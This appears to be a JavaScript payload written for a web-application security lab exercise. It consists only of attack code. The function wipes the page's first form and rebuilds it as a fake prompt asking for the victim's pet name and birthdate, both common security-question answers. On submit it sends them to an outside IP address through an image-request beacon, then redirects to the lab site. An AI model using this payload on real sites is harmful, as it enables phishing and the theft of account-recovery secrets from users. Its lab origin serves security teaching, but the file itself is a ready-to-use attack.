function evilforgot (){
  var evilform = document.forms[0];
  evilform.innerHTML="";
  document.body.appendChild(evilform);
  var input1 = document.createElement("input");
  var input2 = document.createElement("input");
  var evilbtn = document.createElement("button");
  var txt = document.createTextNode("Submit");
  evilbtn.appendChild(txt);
  evilform.appendChild(input1);
  evilform.appendChild(input2);
  evilform.appendChild(evilbtn);
  input1.id = "petname";
  input2.id = "bday";
  petname.setAttribute("class","input-block-level");
  petname.setAttribute("type","text");
  petname.setAttribute("placeholder","What is your Pet's Name ?");
  bday.setAttribute("class","input-block-level");
  bday.setAttribute("type","text");
  bday.setAttribute("placeholder","What is your Birthdate ?");

  evilbtn.onclick = function(){
    var pname = document.forms[0].elements[0].value;
    var birthday = document.forms[0].elements[1].value;
    new Image().src = "http://192.168.1.10/?petname="+pname+"&bday="+birthday;
    document.location = "http://wtvlab.appspot.com/lab/webapp/jfp/3";
  }
}
